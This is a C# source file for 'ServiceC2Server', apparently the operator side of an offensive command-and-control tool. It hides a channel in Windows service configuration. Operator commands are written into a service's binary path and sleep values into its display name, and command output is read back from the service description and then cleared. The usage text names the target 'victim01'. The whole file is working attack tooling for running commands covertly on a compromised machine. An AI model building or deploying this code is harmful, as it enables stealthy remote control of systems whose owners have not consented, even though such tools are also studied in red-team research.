using System;
using System.Management;
using System.Runtime.InteropServices;

namespace ServiceC2Server
{
    internal class Program
    {

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateServiceA(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, [Optional] string lpLoadOrderGroup, [Optional] string lpdwTagId, [Optional] string lpDependencies, [Optional] string lpServiceStartName, [Optional] string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool QueryServiceConfig2A(IntPtr hService, UInt32 dwInfoLevel, IntPtr buffer, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [StructLayout(LayoutKind.Sequential)]
        internal struct SERVICE_DESCRIPTION
        {
            public string lpDescription;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct QUERY_SERVICE_CONFIG
        {
            public int serviceType;
            public int startType;
            public int errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }


        static void PrintHelp()
        {
            Console.WriteLine(
                "sleep <int>      Sets the sleep time to int given\n" +
                "cmd <command>    Executes the value of command\n" +
                "exit             Exits the application gracefully");
        }


        public static void UpdateSleep(ServiceC2 server, string input)
        {
            string sleepTime = input.Split(' ')[1];
            int i = 0;
            bool isInt = int.TryParse(sleepTime, out i);

            if (!isInt)
            {
                Console.WriteLine("[!] Please provide an integer when using the sleep command");
                return;
            }

            IntPtr schService = server.SchService;

            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, null, null, null, null, null, null, sleepTime);
            if (!success)
            {
                Console.WriteLine("[-] Failed to update sleep timer...");

            }
            Console.WriteLine("[+] Sleep updated to: {0}", sleepTime);

        }

        public static string ReadOutput(ServiceC2 server)
        {
            //Console.WriteLine("Waiting for output from " + serviceName);
            string output = "";

            IntPtr schService = server.SchService;

            IntPtr buffer = IntPtr.Zero;
            uint dwBytesNeeded = 0;
            
            bool result = QueryServiceConfig2A(schService, 1, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            result = QueryServiceConfig2A(schService, 1, ptr, dwBytesNeeded, out dwBytesNeeded);
            //Console.WriteLine(dwBytesNeeded);

            if (dwBytesNeeded <= 4)
            {
                //Console.WriteLine("Output is empty");
                return output;
            }

            if (result)
            {
                SERVICE_DESCRIPTION service_description = new SERVICE_DESCRIPTION();

                try
                {
                    service_description = (SERVICE_DESCRIPTION)Marshal.PtrToStructure(ptr, new SERVICE_DESCRIPTION().GetType());

                    output = service_description.lpDescription;
                    //Console.WriteLine("Output: " + output);
                } catch (Exception ex)
                {
                    //Console.WriteLine("Error getting output" + ex.Message);
                }

            }
            
            Marshal.FreeHGlobal(ptr); 
            return output;
        }

        public static void UpdateCommand(ServiceC2 server, string input)
        {
            string newCmd = input.Substring(input.IndexOf(' ')).Remove(0,1);

            IntPtr schService = server.SchService;

            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, newCmd, null, null, null, null, null, null);
            if (!success)
            {
                Console.WriteLine("[-] Failed to Change");

            }
            Console.WriteLine("[+] ChangeServiceConfigA [OK]");

            Console.WriteLine("[+] Cmd updated to: {0}", newCmd);
            
            while (true)
            {
                string output = ReadOutput(server); 
                if (output.Length > 0)
                {
                    Console.WriteLine("Got output: " + output);
                    PostOutput(server, "");
                    break;
                }
            }
        }

        public static bool PostOutput(ServiceC2 server, string output)
        {

            IntPtr schService = server.SchService;

            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();

            service_descriptiona.lpDescription = output;
            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
            if (sdinfo == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed marshalling");

            }

            Marshal.StructureToPtr(service_descriptiona, sdinfo, false);
            bool success = ChangeServiceConfig2(schService, 1, sdinfo);

            if (!success)
            {
                Console.WriteLine("[-] Output update failed");
            }
            Console.WriteLine("[+] Output updated successfully");

            return success;
        }




        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("ServiceC2Server.exe <Unique Identifier");
                Console.WriteLine("ServiceC2Server.exe victim01");
                Environment.Exit(0);
            }
           

            //Setup all the requirements for the C2 server to work...
            string serviceName = "ServiceC2" + args[0];
            ServiceC2 server = new ServiceC2(serviceName);
            IntPtr schService = server.Connect();

            //Catching Ctrl + C events to clean up correctly...
            Console.CancelKeyPress += delegate
            {
                server.Shutdown(true);
            };

            //C2 Loop
            Console.WriteLine("[+] Ready...");
            while (true)
            {
                Console.Write(">");
                string input = Console.ReadLine();
                if (input == "h" || input == "help")
                {
                    PrintHelp();
                }

                if (input.StartsWith("sleep", StringComparison.OrdinalIgnoreCase))
                {
                    UpdateSleep(server, input);
                }

                if (input.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
                {
                    UpdateCommand(server, input);
                }

                if (input.StartsWith("exit", StringComparison.OrdinalIgnoreCase))
                {
                    server.Shutdown(false);
                }
            }
        }
    }
}
